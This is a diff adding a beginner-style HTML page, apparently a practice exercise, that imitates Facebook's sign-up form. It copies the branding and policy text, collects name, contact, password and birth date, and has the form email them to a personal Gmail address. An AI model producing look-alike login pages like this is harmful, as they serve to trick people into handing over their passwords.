@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>face book sign up page </title>
+    <style>
+        body{
+            margin-left: 40%;
+        }
+        #backstyle{
+            background-color: rgb(46, 112, 234);
+        }
+       #firstinput{
+        padding-left: 20px;
+       }
+        
+    </style>
+</head>
+<body>
+<div id="backstyle">
+   <h1> Sign Up</h1>
+    <h3>It's quick and easy.</h3>
+
+</div>
+<form action="mailto:ranjitkale17@gmail.com"method="POST">
+    <input type="text" name="name" placeholder="First Name" id="firstinput" required>
+    <input type="text" name="sirnamename" placeholder="Last Name" required>
+    <br><br>
+    <input type="text" name="email" placeholder=" Mobile number or email Address" required>
+    <br><br>
+    <input type="password" name="password" placeholder="New password" required>
+  
+
+    <br><br>
+    
+
+    Date of birth ?
+    <br>
+    <input type="number" name="Date" min="1" max="31">
+    <select name="month" id="">
+        <option value="">January</option>
+        <option value="">February</option>
+        <option value="">March</option>
+        <option value=""> April</option>
+        <option value="">May</option>
+        <option value="">June</option>
+        <option value="">July</option>
+        <option value="">August</option>
+        <option value="">September</option>
+        <option value="">Octomber</option>
+        <option value="">November</option>
+        <option value="">December</option>
+        
+        <input type="number" min="1901" max="2022">
+       
+    </select>
+    <br><br>
+    <label for="gender-m" class="gen" id="newgen">male</label>
+        <input type="radio" name="gender" value="Male" id="gender-m">
+        <label for="gender-f" class="gen" id="newgen">female</label>
+        <input type="radio" name="gender" value="Female" id="gender-m">
+        <label for="gender-m" class="gen">Custom</label>
+        <input type="radio" name="gender" value="Custom" id="gender-m">
+        <br><br>
+        <pre>People who use our service may have uploaded your contact information to Facebook. Learn more.
+
+            By clicking Sign Up, you agree to our Terms, Data Policyand Cookie Policy. You may receive SMS notifications fromus and can opt out at any time.</pre>
+            <br><br>
+        <input type="submit" name="sign up" value="signup">
+</form>
+
+
+</body>
+</html>
